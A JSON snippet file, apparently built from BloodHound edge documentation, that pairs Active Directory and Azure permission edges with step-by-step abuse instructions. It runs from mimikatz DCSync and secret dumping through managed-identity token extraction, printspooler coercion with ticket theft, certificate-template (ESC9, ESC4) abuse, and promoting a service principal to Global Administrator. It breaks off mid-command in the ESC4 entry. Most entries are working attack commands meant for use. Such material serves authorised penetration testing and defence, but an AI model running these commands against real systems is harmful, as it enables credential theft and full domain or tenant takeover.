{
    "AZMGDirectory_ReadWrite_All": {
        "prefix": "AZMGDirectory_ReadWrite_All",
        "description": "This edge is created when a Service Principal has been granted the Directory.ReadWrite.All edge.",
        "body": [
            "The edge is not abusable, but is used during post-processing to create abusable edges."
        ]
    },
    "AZGlobalAdmin": {
        "prefix": "AZGlobalAdmin",
        "description": "This edge indicates the principal has the Global Admin role active against the target tenant. In other words, the principal is a Global Admin. Global Admins can do almost anything against almost every object type in the tenant, this is the highest privilege role in Azure.",
        "body": [
            "As a Global Admin, you can change passwords, run commands on VMs, read key vault secrets, activate roles for other users, etc.",
            "For Global Admin to be able to abuse Azure resources, you must first grant yourself the ‘User Access Administrator’ role in Azure RBAC. This is done through a toggle button in the portal, or via the PowerZure function Set-AzureElevatedPrivileges.",
            "Once that role is applied to account, you can then add yourself as an Owner to all subscriptions in the tenant"
        ]
    },
    "GetChangesInFilteredSet": {
        "prefix": "GetChangesInFilteredSet",
        "description": "he principal is allowed to synchronize (DCSync) the Filtered Attribute Set (FAS), which are the attributes not replicated to RODCs",
        "body": [
            "This edge is not abuseable by itself. When combined with [GetChanges](/resources/edges/get-changes), BloodHound will create the abuseable edge [SyncLAPSPassword](/resources/edges/sync-laps-password)."
        ]
    },
    "AZManagedIdentity": {
        "prefix": "AZManagedIdentity",
        "description": "Azure resources like Virtual Machines, Logic Apps, and Automation Accounts can be assigned to either System- or User-Assigned Managed Identities.",
        "body": [
            "You can modify the Azure RM resource to execute actions against Azure with the privileges of the Managed Identity Service Principal.",
            "It is also possible to extract a JSON Web Token (JWT) for the Service Principal, then use that JWT to authenticate as the Service Principal outside the scope of the Azure RM resource. Here is how you extract the JWT using PowerShell:",
            "```bash",
            "$tokenAuthURI = $env:MSI_ENDPOINT + \"?resource=https://graph.microsoft.com/&api-version=2017-09-01\"",
            "$tokenResponse = Invoke-RestMethod -Method Get -Headers @{\"Secret\"=\"$env:MSI_SECRET\"} -Uri $tokenAuthURI",
            "$tokenResponse.access_token",
            "```",
            "We can then use this JWT to authenticate as the Service Principal to the Microsoft Graph APIs using BARK for example."
        ]
    },
    "DumpSMSAPassword": {
        "prefix": "DumpSMSAPassword",
        "description": "A computer with this indicates that a Standalone Managed Service Account (sMSA) is installed on it.",
        "body": [
            "From an elevated command prompt on the computer where the sMSA resides, run mimikatz then execute the following commands:",
            "```bash",
            "privilege::debug",
            "token::elevate",
            "lsadump::secrets",
            "```",
            "In the output, find _\\_SC\\_\\{262E99C9-6160-4871-ACEC-4E61736B6F21}__ suffixed by the name of the targeted sMSA. The next line contains _cur/hex :_ followed with the sMSA’s password hex-encoded.",
            "To use this password, its NT hash must be calculated. This can be done using a small python script:",
            "```bash",
            "# nt.py",
            "import sys, hashlib",
            "pw_hex = sys.argv[1]",
            "nt_hash = hashlib.new('md4', bytes.fromhex(pw_hex)).hexdigest()",
            "print(nt_hash)",
            "```",
            "Execute it like so:",
            "```bash",
            "python3 nt.py 35f3e1713d61...",
            "```",
            "To authenticate as the sMSA, leverage pass-the-hash.",
            "Alternatively, to avoid executing mimikatz on the host, you can save a copy of the _SYSTEM_ and _SECURITY_ registry hives from an elevated prompt:",
            "```bash",
            "reg save HKLM\\SYSTEM %temp%\\SYSTEM & reg save HKLM\\SECURITY %temp%\\SECURITY",
            "```",
            "Transfer the files named _SYSTEM_ and _SECURITY_ that were saved at _%temp%_ to another computer where mimikatz can be safely executed.",
            "On this other computer, run mimikatz from a command prompt then execute the following command to obtain the hex-encoded password:",
            "```bash",
            "lsadump::secrets /system:C:\\path\\to\\file\\SYSTEM /security:C:\\path\\to\\file\\SECURITY",
            "```"
        ]
    },
    "AZOwns": {
        "prefix": "AZOwns",
        "description": "The principal is granted owner rights on the principal.",
        "body": [
            "Object ownership means almost all abuses are possible against the target object."
        ]
    },
    "AllExtendedRights": {
        "prefix": "AllExtendedRights",
        "description": "Extended rights are special rights granted on objects which allow reading of privileged attributes, as well as performing special actions.",
        "body": [
            "### **User**",
            "Having this privilege over a user grants the ability to reset the user’s password. For more information about that, see the ForceChangePassword edge section",
            "### **Computer**",
            "You may read the LAPS password of the computer object. For more information about that, see the ReadLAPSPassword edge section.",
            "### **Domain**",
            "The AllExtendedRights permission grants both the DS-Replication-Get-Changes and DS-Replication-Get-Changes-All privileges, which combined allow a principal to replicate objects from the domain. This can be abused using the lsadump::dcsync command in mimikatz.",
            "### **CertTemplate**",
            "The AllExtendedRights permission grants enrollment rights on the certificate template.",
            "The following additional requirements must be met for a principal to be able to enroll a certificate:",
            "1.  The certificate template is published on an enterprise CA",
            "2.  The principal has Enroll permission on the enterprise CA",
            "3.  The principal meets the issuance requirements and the requirements for subject name and subject alternative name defined by the template",
            "Certify can be used to enroll a certificate on Windows:",
            "```bash",
            "Certify.exe request /ca:SERVER\\\\CA-NAME /template:TEMPLATE",
            "```",
            "Certipy can be used to enroll a certificate on Linux:",
            "```bash",
            "certipy req -u USER@CORP.LOCAL -p PWD -ca CA-NAME -target SERVER -template TEMPLATE",
            "```"
        ]
    },
    "AZAddMembers": {
        "prefix": "AZAddMembers",
        "description": "The ability to add other principals to an Azure security group",
        "body": [
            "Via the Azure portal:",
            "1.  Find the group in your tenant (Microsoft Entra ID -> Manage -> Groups -> Find Group in list)",
            "2.  Click the group from the list",
            "3.  In the overview, click “View group memberships”",
            "4.  At the top, click “Add memberships”",
            "5.  Find the principals you want to add to the group and click them, then click “select” at the bottom",
            "6.  You should see a message in the top right saying “Successfully added membership”",
            "Via PowerZure:",
            "Add-AzureADGroup -User \\[UPN\\] -Group \\[Group name\\]"
        ]
    },
    "GPLink": {
        "prefix": "GPLink",
        "description": " linked GPO applies its settings to objects in the linked container",
        "body": [
            "Control over the GPO can be abused to compromise the AD accounts the GPO applies to by modifying the GPO policy settings.",
            "Refer to [A Red Teamer's Guide to GPOs and OUs](https://wald0.com/?p=179) for details about the abuse technique, and check out the following tools for practical exploitation:",
            " - **Windows**: [SharpGPOAbuse](https://github.com/FSecureLABS/SharpGPOAbuse)",
            " - **Linux**: [pyGPOAbuse](https://github.com/Hackndo/pyGPOAbuse)"
        ]
    },
    "AZKeyVaultContributor": {
        "prefix": "AZKeyVaultContributor",
        "description": "The Key Vault Contributor role grants full control of the target Key Vault. This includes the ability to read all secrets stored on the Key Vault.",
        "body": [
            "You can read secrets and alter access policies (grant yourself access to read secrets)",
            "Via PowerZure:",
            "* [Get-AzureKeyVaultContent](https://powerzure.readthedocs.io/en/latest/Functions/operational.html#get-azurekeyvaultcontent)",
            "* [Export-AzureKeyVaultContent](https://powerzure.readthedocs.io/en/latest/Functions/operational.html#export-azurekeyvaultcontent)"
        ]
    },
    "DCSync": {
        "prefix": "DCSync",
        "description": "This edge represents the combination of GetChanges and GetChangesAll. The combination of both these privileges grants a principal the ability to perform the DCSync attack.",
        "body": [
            "With both GetChanges and GetChangesAll privileges in BloodHound, you may perform a dcsync attack to get the password hash of an arbitrary principal using mimikatz:",
            "lsadump::dcsync /domain:testlab.local /user:Administrator",
            "You can also perform the more complicated ExtraSids attack to hop domain trusts. For information on this see the blog post by harmj0y in the references tab."
        ]
    },
    "DCFor": {
        "prefix": "DCFor",
        "description": "This edge indicates that the computer is a domain controller for the domain. This edge is not created for read-only domain controllers.",
        "body": [
            "Domain Controllers store all Active Directory credentials and configurations for all principals in the domain. If an adversary gains administrative access to a Domain Controller, there are several options at their disposal for compromising domain identities and domain-managed systems. Please see the references section for more information."
        ]
    },
    "AZMGAppRoleAssignment_ReadWrite_All": {
        "prefix": "AZMGAppRoleAssignment_ReadWrite_All",
        "description": "This edge is created when a Service Principal has been granted the AppRoleAssignment.ReadWrite.All edge.",
        "body": [
            "The edge is not abusable, but is used during post-processing to create abusable edges."
        ]
    },
    "AZMGGrantAppRoles": {
        "prefix": "AZMGGrantAppRoles",
        "description": "This edge is created during post-processing.",
        "body": [
            "With the ability to grant arbitrary app roles, you can grant the RoleManagement.ReadWrite.Directory app role to a Service Principal you already control, and then promote it or another principal to Global Administrator.",
            "These functions require you to supply an MS Graph-scoped JWT associated with the Service Principal that has the privilege to grant app roles. There are several ways to acquire a JWT. For example, you may use BARK’s Get-MSGraphTokenWithClientCredentials to acquire an MS Graph-scoped JWT by supplying a Service Principal Client ID and secret:",
            "```bash",
            "$MGToken = Get-MSGraphTokenWithClientCredentials `",
            "    -ClientID \"34c7f844-b6d7-47f3-b1b8-720e0ecba49c\" `",
            "    -ClientSecret \"asdf...\" `",
            "    -TenantName \"contoso.onmicrosoft.com\"",
            "```",
            "Use BARK’s Get-AllAzureADServicePrincipals to collect all Service Principal objects in the tenant:",
            "```bash",
            "$SPs | ?{$_.appId -Like \"00000003-0000-0000-c000-000000000000\"} | Select id",
            "```",
            "Next, find the MS Graph Service Principal’s ID. You can do this by piping $SPs to Where-Object, finding objects where the appId value matches the universal ID for the MS Graph Service Principal, which is 00000003-0000-0000-c000-000000000000:",
            "```bash",
            "$SPs | ?{$_.appId -Like \"00000003-0000-0000-c000-000000000000\"} | Select id",
            "```",
            "The output will be the object ID of the MS Graph Service Principal. Take that ID and use it as the “ResourceID” argument for BARK’s New-AppRoleAssignment function. The AppRoleID of ‘9e3f62cf-ca93-4989-b6ce-bf83c28f9fe8’ is the universal ID for RoleManagement.ReadWrite.Directory. The SPObjectId is the object ID of the Service Principal you want to grant this app role to:",
            "```bash",
            "New-AppRoleAssignment `",
            "    -SPObjectId \"6b6f9289-fe92-4930-a331-9575e0a4c1d8\" `",
            "    -AppRoleID \"9e3f62cf-ca93-4989-b6ce-bf83c28f9fe8\" `",
            "    -ResourceID \"9858020a-4c00-4399-9ae4-e7897a8333fa\" `",
            "    -Token $MGToken",
            "```",
            "If successful, the output of this command will show you the App Role assignment ID. Now that your Service Principal has the RoleManagement.ReadWrite.Directory MS Graph app role, you can promote the Service Principal to Global Administrator using BARK’s New-AzureADRoleAssignment.",
            "```bash",
            "New-AzureADRoleAssignment `",
            "    -PrincipalID \"6b6f9289-fe92-4930-a331-9575e0a4c1d8\" `",
            "    -RoleDefinitionId \"62e90394-69f5-4237-9190-012177145e10\" `",
            "    -Token $MGToken",
            "```",
            "If successful, the output will include the principal ID, the role ID, and a unique ID for the role assignment."
        ]
    },
    "AZGetSecrets": {
        "prefix": "AZGetSecrets",
        "description": "The ability to read secrets from key vaults.",
        "body": [
            "Use PowerShell or PowerZure to fetch the certificate from the key vault.",
            "Via PowerZure:",
            "* Get-AzureKeyVaultContent",
            "* Export-AzureKeyVaultcontent"
        ]
    },
    "AZMGGroupMember_ReadWrite_All": {
        "prefix": "AZMGGroupMember_ReadWrite_All",
        "description": "This edge is created when a Service Principal has been granted the GroupMember.ReadWrite.All edge.",
        "body": [
            "The edge is not abusable, but is used during post-processing to create abusable edges."
        ]
    },
    "CoerceToTGT": {
        "prefix": "CoerceToTGT",
        "description": "The computer/user account is configured with Kerberos unconstrained delegation.",
        "body": [
            "A common way for attackers to abuse unconstrained delegation is for the attacker to coerce a DC using the printspooler.",
            "The attack will fail if the target is a member of Protected Users or marked as sensitive, as the TGT of those principals will not be sent to the principal with unconstrained delegation. You can find all the protected principals with this Cypher query:",
            "```bash",
            "MATCH (g:Group)",
            "WHERE g.objectid ENDS WITH \"-525\"",
            "MATCH (n:Base)",
            "WHERE n.sensitive = TRUE OR (n)-[:MemberOf*..]->(g)",
            "RETURN n",
            "LIMIT 1000",
            "```",
            "There are many other coercion techniques than printspooler that can be used (see References).",
            "The instructions provided here are for abusing a computer with unconstrained delegation. For abuse of a user, see [Abusing Users Configured with Unconstrained Delegation](https://exploit.ph/user-constrained-delegation.html).",
            "**Step 1: Start monitoring for TGTs**",
            "Log in on the computer configured with unconstrained delegation and open CMD as Administrator.",
            "Start monitoring for incoming TGTs using Rubeus:",
            "```bash",
            "Rubeus.exe request monitor /user:<target DC DNS name> /interval:5 /nowrap",
            "```",
            "**Step 2: Coerce target DC**",
            "From any host in the domain, coerce the target DC using printspooler.",
            "Windows:",
            "```bash",
            "SpoolSample.exe <target DC DNS name> <compromised computer DNS name>",
            "```",
            "Linux:",
            "```bash",
            "printerbug.py '<domain>/<username>:<password>'@<target DC IP> <compromised computer IP>",
            "```",
            "Rubeus will print the DC TGT as it is received.",
            "**Step 3: Pass the Ticket**",
            "Windows:",
            "Inject the DC TGT into memory using Rubeus on any computer in the domain:",
            "```bash",
            "Rubeus.exe ptt /ticket:doIFvjCCBbqgAwI...",
            "```",
            "Linux:",
            "Save the TGT base64 blob as a .kirbi file:",
            "```bash",
            "echo \"doIFvjCCBbqgAwI...\" | base64 -d | tee ticket.kirbi > /dev/null",
            "```",
            "Convert the TGT to ccache format using ticketConverter.py:",
            "```bash",
            "ticketConverter.py ticket.kirbi ticket.ccache",
            "```",
            "Set the KRB5CCNAME environment variable to the ticket's path:",
            "```bash",
            "export KRB5CCNAME=$path_to_ticket.ccache",
            "```",
            "**Step 4: DCSync target domain**",
            "Windows:",
            "Use mimikatz to DCSync the domain from the computer where the DC TGT was injected:",
            "```bash",
            "lsadump::dcsync /domain:<domain.name> /user:<DOMAIN\\targetuser>",
            "```",
            "Linux:",
            "Use secretsdump.py to DCSync the target domain:",
            "```bash",
            "secretsdump.py -k -just-dc-user <DOMAIN/targetuser> <target DC DNS name>",
            "```"
        ]
    },
    "AZGetKeys": {
        "prefix": "AZGetKeys",
        "description": "The ability to read keys from key vaults.",
        "body": [
            "Use PowerShell or PowerZure to fetch the certificate from the key vault.",
            "Via PowerZure:",
            "* Get-AzureKeyVaultContent",
            "* Export-AzureKeyVaultcontent"
        ]
    },
    "AZAKSContributor": {
        "prefix": "AZAKSContributor",
        "description": "The Azure Kubernetes Service Contributor role grants full control of the target Azure Kubernetes Service Managed Cluster.",
        "body": [
            "You can use BARK’s Invoke-AzureRMAKSRunCommand function to execute commands on compute nodes associated with the target AKS Managed Cluster.",
            "This function requires you to supply an Azure Resource Manager scoped JWT associated with the principal that has the privilege to execute commands on the cluster. There are several ways to acquire a JWT. For example, you may use BARK’s Get-ARMTokenWithRefreshToken to acquire an Azure RM-scoped JWT by supplying a refresh token:",
            "```bash",
            "$ARMToken = Get-ARMTokenWithRefreshToken `",
            "    -RefreshToken \"0.ARwA6WgJJ9X2qk...\" `",
            "    -TenantID \"contoso.onmicrosoft.com\"",
            "```",
            "Now you can use BARK’s Invoke-AzureRMAKSRunCommand function to execute a command against the target AKS Managed Cluster. For example, to run a simple “whoami” command:",
            "```bash",
            "Invoke-AzureRMAKSRunCommand `",
            "    -Token $ARMToken `",
            "    -TargetAKSId \"/subscriptions/f1816681-4df5-4a31-acfa-922401687008/resourcegroups/AKS_ResourceGroup/providers/Microsoft.ContainerService/managedClusters/mykubernetescluster\" `",
            "    -Command \"whoami\"",
            "```",
            "If the AKS Cluster or its associated Virtual Machine Scale Sets have managed identity assignments, you can use BARK’s Invoke-AzureRMAKSRunCommand function to retrieve a JWT for the managed identity Service Principal like this:",
            "```bash",
            "Invoke-AzureRMAKSRunCommand `",
            "    -Token $ARMToken `",
            "    -TargetAKSId \"/subscriptions/f1816681-4df5-4a31-acfa-922401687008/resourcegroups/AKS_ResourceGroup/providers/Microsoft.ContainerService/managedClusters/mykubernetescluster\" `",
            "    -Command \\\\'curl -i -H \"Metadata: true\" \"http://169.254.169.254/metadata/identity/oauth2/token?resource=https://graph.microsoft.com/&api-version=2019-08-01\"\\\\'",
            "```",
            "If successful, the output will include a JWT for the managed identity service principal."
        ]
    },
    "AZAvereContributor": {
        "prefix": "AZAvereContributor",
        "description": "ny principal granted the Avere Contributor role, scoped to the affected VM, can reset the built-in administrator password on the VM",
        "body": [
            "The Avere Contributor role allows you to run SYSTEM commands on the VM",
            "Via PowerZure:",
            "* [Invoke-AzureRunCommand](https://powerzure.readthedocs.io/en/latest/Functions/operational.html#invoke-azureruncommand)",
            "* [Invoke-AzureRunMSBuild](https://powerzure.readthedocs.io/en/latest/Functions/operational.html#invoke-azurerunmsbuild)",
            "* [Invoke-AzureRunProgram](https://powerzure.readthedocs.io/en/latest/Functions/operational.html#invoke-azurerunprogram)"
        ]
    },
    "AZUserAccessAdministrator": {
        "prefix": "AZUserAccessAdministrator",
        "description": "The User Access Admin role can edit roles against many other objects.",
        "body": [
            "This role can be used to grant yourself or another principal any privilege you want against Automation Accounts, VMs, Key Vaults, and Resource Groups. For example, you can make yourself an administrator of an Azure Subscription by assigning the Owner role at the Subscription scope.",
            "The simplest way to execute this attack is to use the Azure portal to add a new, abusable role assignment against the target object for yourself.",
            "If this role is assigned to a Service Principal, you won't be able to authenticate directly to the Azure portal. In this case:",
            "You'll need to acquire a bearer token for the service principal with AzureRM as the audience. This can be done using BARK's Get-AzureRMTokenWithClientCredentials cmdlet.",
            "Using that token, you can make a call to the AzureRM API to create a new role assignment on the target object, such as assigning yourself the Owner role. This can be done using BARK's New-AzureRMRoleAssignment cmdlet."
        ]
    },
    "AZRunsAs": {
        "prefix": "AZRunsAs",
        "description": "The Azure App runs as the Service Principal when it needs to authenticate to the tenant.",
        "body": [
            "This edge should be taken into consideration when abusing control of an app. Apps authenticate with service principals to the tenant, so if you have control of an app, what you are abusing is that control plus the fact that the app runs as a privileged service principal."
        ]
    },
    "AZContains": {
        "prefix": "AZContains",
        "description": "This indicates that the parent object contains the child object, such as a resource group containing a virtual machine, or a tenant “containing” a subscription.",
        "body": [
            "Control of the parent object also gives control of the child object."
        ]
    },
    "AZScopedTo": {
        "prefix": "AZScopedTo",
        "description": "Is used to distinguish whether an EntraID (AzureAD) admin role such as Application Administrator or Cloud Application Administrator is scoped to the tenant or to a particular app registration or service principal.",
        "body": [
            "When a principal has such a role scoped to the tenant, they gain control of all app registrations and service principals in the tenant. If a principal has the same role scoped to individual objects, they only gain control of those particular objects. This is unique to just a handful of roles, but custom roles can also work this way."
        ]
    },
    "ADCSESC9b": {
        "prefix": "ADCSESC9b",
        "description": "The principal has control over a victim computer with permission to enroll on one or more certificate templates, configured to: 1) enable certificate authentication, 2) require the `dNSHostName`  of the enrollee included in the Subject Alternative Name (SAN), and 3) not have the security extension enabled.",
        "body": [
            "### Windows",
            "Step 1: Remove SPNs including `dNSHostName` on victim.",
            "The SPNs of the victim will be automatically updated when you change the `dNSHostName`. AD will not allow the same SPN entry to be set on two accounts. Therefore, you must remove any SPN on the victim account that includes the victim's `dNSHostName`.",
            "Set SPN of the victim computer using PowerView:",
            "```bash",
            "Set-DomainObject -Identity VICTIM -Set @{'serviceprincipalname'='HOST/victim'}",
            "```",
            "Step 2: Set `dNSHostName` of victim computer to targeted computer's `dNSHostName`.",
            "Set the `dNSHostName` of the victim computer using PowerView:",
            "```bash",
            "Set-DomainObject -Identity VICTIM -Set @{'dnshostname'='target.corp.local'}",
            "```",
            "Step 3: Check if the 'mail' attribute of victim must be set and set it if required.",
            "If the certificate template is of schema version 2 or above, and its attribute 'msPKI-CertificateNameFlag' contains the flag SUBJECT\\_REQUIRE\\_EMAIL and/or SUBJECT\\_ALT\\_REQUIRE_EMAIL, then the victim principal must have their mail attribute set for the certificate enrollment. The CertTemplate BloodHound node will have \"Subject Require Email\" or \"Subject Alternative Name Require Email\" set to true if any of the flags are present.",
            "If the certificate template is of schema version 1 or does not have any of the email flags, then",
            "continue to Step 4.",
            "If any of the two flags are present, you will need the victim's mail attribute to be set. The value of",
            "the attribute will be included in the issues certificate but it is not used to identify the target",
            "principal why it can be set to any arbitrary string.",
            "Check if the victim has the mail attribute set using PowerView:",
            "```bash",
            "Get-DomainObject -Identity VICTIM -Properties mail",
            "```",
            "If the victim has the mail attribute set, continue to Step 4.",
            "If the victim does not has the mail attribute set, set it to a dummy mail using PowerView:",
            "```bash",
            "Set-DomainObject -Identity VICTIM -Set @{'mail'='dummy@mail.com'}",
            "```",
            "Step 4: Obtain a session as victim.",
            "There are several options for this step. You can obtain a session as SYSTEM on the host, which allows you to interact with AD as the computer account, by abusing control over the computer AD object (see [GenericAll edge](/resources/edges/generic-all) documentation).",
            "Step 5: Enroll certificate as victim.",
            "Use Certify as the victim computer to request enrollment in the affected template, specifying the affected EnterpriseCA:",
            "```bash",
            "Certify.exe request /ca:SERVERCA-NAME /template:TEMPLATE /machine",
            "```",
            "Save the certificate as `cert.pem` and the private key as `cert.key`.",
            "Step 6: Convert the emitted certificate to PFX format:",
            "```bash",
            "certutil.exe -MergePFX .\\cert.pem .\\cert.pfx",
            "```",
            "Step 7 (optional): Set `dNSHostName` and SPN of victim to the previous values.",
            "To avoid issues in the environment, set the `dNSHostName` and SPN of the victim computer back to its previous values using PowerView:",
            "```bash",
            "Set-DomainObject -Identity VICTIM -Set @{'dnshostname'='victim.corp.local'}",
            "```",
            "```bash",
            "Set-DomainObject -Identity VICTIM -Set @{'serviceprincipalname'='HOST/victim'}",
            "```",
            "Step 8: Perform Kerberos authentication as targeted computer against affected DC using certificate.",
            "Use Rubeus to request a ticket granting ticket (TGT) from an affected DC, specifying the",
            "target identity to impersonate and the PFX-formatted certificate created in Step 6:",
            "```bash",
            "Rubeus.exe asktgt /certificate:cert.pfx /user:TARGET$ /domain:DOMAIN /dc:DOMAIN_CONTROLLER",
            "```",
            "### Linux",
            "Step 1: Remove SPNs including `dNSHostName` on victim.",
            "The SPNs of the victim will be automatically updated when you change the `dNSHostName`. AD will not allow the same SPN entry to be set on two accounts. Therefore, you must remove any SPN on the victim account that includes the victim's `dNSHostName`.",
            "Remove SPN entries with ldapmodify:",
            "```bash",
            "echo -e \"dn: VICTIM-DN\\nchangetype: modify\\ndelete: servicePrincipalName\\nservicePrincipalName: SPN\" | ldapmodify -x -D \"ATTACKER-DN\" -w 'PWD' -h DOMAIN-DNS-NAME",
            "```",
            "Step 2: Set `dNSHostName` of victim computer to targeted computer's `dNSHostName`.",
            "Set the `dNSHostName` of the victim computer using Certipy:",
            "```bash",
            "certipy account update -username ATTACKER@CORP.LOCAL -password PWD -user VICTIM -dns TARGET.CORP.LOCAL",
            "```",
            "Step 3: Check if the 'mail' attribute of victim must be set and set it if required.",
            "If the certificate template is of schema version 2 or above, and its attribute 'msPKI-CertificateNameFlag' contains the flag SUBJECT\\_REQUIRE\\_EMAIL and/or SUBJECT\\_ALT\\_REQUIRE_EMAIL, then the victim principal must have their mail attribute set for the certificate enrollment. The CertTemplate BloodHound node will have \"Subject Require Email\" or \"Subject Alternative Name Require Email\" set to true if any of the flags are present.",
            "If the certificate template is of schema version 1 or does not have any of the email flags, then",
            "continue to Step 4.",
            "If any of the two flags are present, you will need the victim's mail attribute to be set. The value of",
            "the attribute will be included in the issues certificate but it is not used to identify the target",
            "principal why it can be set to any arbitrary string.",
            "Check if the victim has the mail attribute set using ldapsearch:",
            "```bash",
            "ldapsearch -x -D \"ATTACKER-DN\" -w 'PWD' -h DOMAIN-DNS-NAME -b \"VICTIM-DN\" mail",
            "```",
            "If the victim has the mail attribute set, continue to Step 4.",
            "If the victim does not has the mail attribute set, set it to a dummy mail using ldapmodify:",
            "```bash",
            "echo -e \"dn: VICTIM-DN\\nchangetype: modify\\nreplace: mail\\nmail: test@mail.com\" | ldapmodify -x -D \"ATTACKER-DN\" -w 'PWD' -h DOMAIN-DNS-NAME",
            "```",
            "Step 4: Obtain a session as victim.",
            "There are several options for this step. You can obtain a session as SYSTEM on the host, which allows you to interact with AD as the computer account, by abusing control over the computer AD object (see [GenericAll edge](/resources/edges/generic-all) documentation).",
            "Step 5: Enroll certificate as victim.",
            "Use Certipy as the victim principal to request enrollment in the affected template, specifying the affected EnterpriseCA:",
            "```bash",
            "certipy req -u VICTIM@CORP.LOCAL -p PWD -ca CA-NAME -target SERVER -template TEMPLATE",
            "```",
            "Step 6 (optional): Set `dNSHostName` and SPN of victim to the previous values.",
            "To avoid issues in the environment, set the `dNSHostName` and SPN of the victim computer back to its previous value using Certipy and ldapmodify:",
            "```bash",
            "certipy account update -username ATTACKER@CORP.LOCAL -password PWD -user VICTIM -dns VICTIM.CORP.LOCAL",
            "```",
            "```bash",
            "echo -e \"dn: VICTIM-DN\\nchangetype: modify\\nadd: servicePrincipalName\\nservicePrincipalName: SPN\" | ldapmodify -x -D \"ATTACKER-DN\" -w 'PWD' -h DOMAIN-DNS-NAME",
            "```",
            "Step 7: Perform Kerberos authentication as targeted computer against affected DC using certificate.",
            "Request a ticket granting ticket (TGT) from an affected DC, specifying the certificate created in Step 5 and the IP of an affected DC:",
            "```bash",
            "certipy auth -pfx TARGET.pfx -dc-ip IP",
            "```"
        ]
    },
    "AZNodeResourceGroup": {
        "prefix": "AZNodeResourceGroup",
        "description": "This edge is created to link Azure Kubernetes Service Managed Clusters to the Virtual Machine Scale Sets they use to execute commands on.",
        "body": [
            "You will abuse this relationship by executing a command against the AKS Managed Cluster the edge is emitting from. You can target any managed identity assignment scoped to the Virtual Machine Scale Sets under the target Resource Group."
        ]
    },
    "AZMGServicePrincipalEndpoint_ReadWrite_All": {
        "prefix": "AZMGServicePrincipalEndpoint_ReadWrite_All",
        "description": "This edge is created when a Service Principal has been granted the ServicePrincipalEndpoint.ReadWrite.All edge.",
        "body": [
            "The edge is not abusable, but is used during post-processing to create abusable edges."
        ]
    },
    "ADCSESC4": {
        "prefix": "ADCSESC4",
        "description": "The ADCSESC4 edge indicates that the principal has the privileges to perform the ADCS ESC4 abuse against the target AD domain.",
        "body": [
            "An attacker may perform this attack in the following steps:",
            "### Step 0.1: Obtain ownership (WriteOwner only)",
            "If you only have WriteOwner on the affected certificate template, then you need to grant your principal ownership over the template.",
            "#### Windows",
            "Use the following PowerShell snippet to check the current ownership on the certificate template:",
            "```bash",
            "$templateName = \"TemplateName\" # Use CN, not display name",
            "# Find the certificate template",
            "$rootDSE = New-Object DirectoryServices.DirectoryEntry(\"LDAP://RootDSE\")",
            "$template = [ADSI]\"LDAP://CN=$templateName,CN=Certificate Templates,CN=Public Key Services,CN=Services,$($rootDSE.configurationNamingContext)\"",
            "# Print the owner",
            "$acl = $template.psbase.ObjectSecurity",
            "$acl.Owner",
            "```",
            "Use the following PowerShell snippet to grant the principal ownership on the certificate template:",
            "```bash",
            "$templateName = \"TemplateName\" # Use CN, not display name",
            "$principalName = \"principal\" # SAM account name of principal",
            "# Find the certificate template",
            "$rootDSE = New-Object DirectoryServices.DirectoryEntry(\"LDAP://RootDSE\")",
            "$template = [ADSI]\"LDAP://CN=$templateName,CN=Certificate Templates,CN=Public Key Services,CN=Services,$($rootDSE.configurationNamingContext)\"",
            "# Set owner",
            "$acl = $template.psbase.ObjectSecurity",
            "$account = New-Object System.Security.Principal.NTAccount($principalName)",
            "$acl.SetOwner($account)",
            "$template.psbase.CommitChanges()",
            "```",
            "Confirm that the ownership was changed by running the first script again.",
            "After abuse, set the ownership back to previous owner using the second script.",
            "#### Linux",
            "To check the current owner of the certificate template, you may use Impacket's owneredit:",
            "```bash",
            "owneredit.py -action read -target-dn 'template-dn' 'domain'/'attacker':'password'",
            "```",
            "Change the ownership of the object:",
            "```bash",
            "owneredit.py -action write -new-owner 'attacker' -target-dn 'template-dn' 'domain'/'attacker':'password'",
            "```",
            "Confirm that the ownership was changed by running the first script again.",
            "After abuse, set the ownership back to previous owner using the second script.",
            "### Step 0.2: Obtain GenericAll (WriteOwner, Owns, or WriteDacl only)",
            "If you only have WriteOwner, Owns, or WriteDacl on the affected certificate template, then you need to grant your principal GenericAll over the template.",
            "#### Windows",
            "Use the following PowerShell snippet to grant the principal GenericAll on the certificate template:",
            "```bash",
            "$templateName = \"TemplateName\" # Use CN, not display name",
            "$principalName = \"principal\" # SAM account name of principal",
            "# Find the certificate template",
            "$rootDSE = New-Object DirectoryServices.DirectoryEntry(\"LDAP://RootDSE\")",
            "$template = [ADSI]\"LDAP://CN=$templateName,CN=Certificate Templates,CN=Public Key Services,CN=Services,$($rootDSE.configurationNamingContext)\"",
            "# Construct the ACE",
            "$account = New-Object System.Security.Principal.NTAccount($principalName)",
            "$sid = $account.Translate([System.Security.Principal.SecurityIdentifier])",
            "$ace = New-Object DirectoryServices.ActiveDirectoryAccessRule(",
            "$sid,",
            "[System.DirectoryServices.ActiveDirectoryRights]::GenericAll,",
            "[System.Security.AccessControl.AccessControlType]::Allow",
            ")",
            "# Add the new ACE to the ACL",
            "$acl = $template.psbase.ObjectSecurity",
            "$acl.AddAccessRule($ace)",
            "$template.psbase.CommitChanges()",
            "```",
            "Confirm that the GenericAll ACE was added:",
            "```bash",
            "$templateName = \"TemplateName\" # Use CN, not display name",
            "$principalName = \"principal\" # SAM account name of principal",
            "# Find the certificate template",
            "$rootDSE = New-Object DirectoryServices.DirectoryEntry(\"LDAP://RootDSE\")",
            "$template = [ADSI]\"LDAP://CN=$templateName,CN=Certificate Templates,CN=Public Key Services,CN=Services,$($rootDSE.configurationNamingContext)\"",
            "# Print ACEs granted to the principal",
            "$acl = $template.psbase.ObjectSecurity",
            "$acl.Access | ? { $_.IdentityReference -like \"*$principalName\" }",
            "```",
            "After abuse, remove the GenericAll ACE you added:",
            "```bash",
            "$templateName = \"TemplateName\" # Use CN, not display name",
            "$principalName = \"principal\" # SAM account name of principal",
            "# Find the certificate template",
            "$rootDSE = New-Object DirectoryServices.DirectoryEntry(\"LDAP://RootDSE\")",
            "$template = [ADSI]\"LDAP://CN=$templateName,CN=Certificate Templates,CN=Public Key Services,CN=Services,$($rootDSE.configurationNamingContext)\"",
            "# Construct the ACE",
            "$account = New-Object System.Security.Principal.NTAccount($principalName)",
            "$sid = $account.Translate([System.Security.Principal.SecurityIdentifier])",
            "$ace = New-Object DirectoryServices.ActiveDirectoryAccessRule(",
            "$sid,",
            "[System.DirectoryServices.ActiveDirectoryRights]::GenericAll,",
            "[System.Security.AccessControl.AccessControlType]::Allow",
            ")",
            "# Remove the ACE from the ACL",
            "$acl = $template.psbase.ObjectSecurity",
